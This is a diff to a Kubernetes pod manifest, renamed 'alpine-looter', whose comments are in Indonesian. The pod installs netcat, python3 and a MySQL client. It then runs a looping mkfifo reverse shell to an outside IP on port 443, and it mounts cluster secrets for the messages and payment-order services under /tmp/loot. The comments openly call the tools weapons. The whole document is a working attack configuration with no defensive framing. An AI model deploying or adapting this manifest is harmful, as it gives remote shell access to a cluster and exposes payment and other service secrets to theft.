@@ -5,33 +5,32 @@ metadata:
   namespace: backbase
 spec:
   containers:
-  - name: alpine
+  - name: alpine-looter
     image: alpine:latest
-    command: ["/bin/sh"]
+    command: ["/bin/sh", "-c"]
     args:
-    - "-c"
     - |
-      apk add --update netcat-openbsd
+      # 1. Install ulang senjatanya pas pod baru lahir
+      apk add --update netcat-openbsd python3 mysql-client
+      
+      # 2. Tembak reverse shell pake jurus mkfifo
       while true; do
-        echo "=== Sniper-V7: Konek balik ke Ubuntu... ==="
-        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 443 > /tmp/f
+        rm -f /tmp/f; mkfifo /tmp/f
+        cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 443 > /tmp/f
         sleep 5
       done
     volumeMounts:
-    - name: vol-mysql
-      mountPath: /tmp/secrets/mysql
-    - name: vol-identity
-      mountPath: /tmp/secrets/identity
-    - name: vol-db-certs
-      mountPath: /tmp/secrets/db-certs
+    - name: v-msg
+      mountPath: /tmp/loot/messages
+    - name: v-pay
+      mountPath: /tmp/loot/payment
   volumes:
-  - name: vol-mysql
+  - name: v-msg
     secret:
-      secretName: mysql-secret
-  - name: vol-identity
+      secretName: messages-secret
+      optional: true
+  - name: v-pay
     secret:
-      secretName: identity-secret
-  - name: vol-db-certs
-    secret:
-      secretName: database-certs
+      secretName: payment-order-service
+      optional: true
   restartPolicy: Never
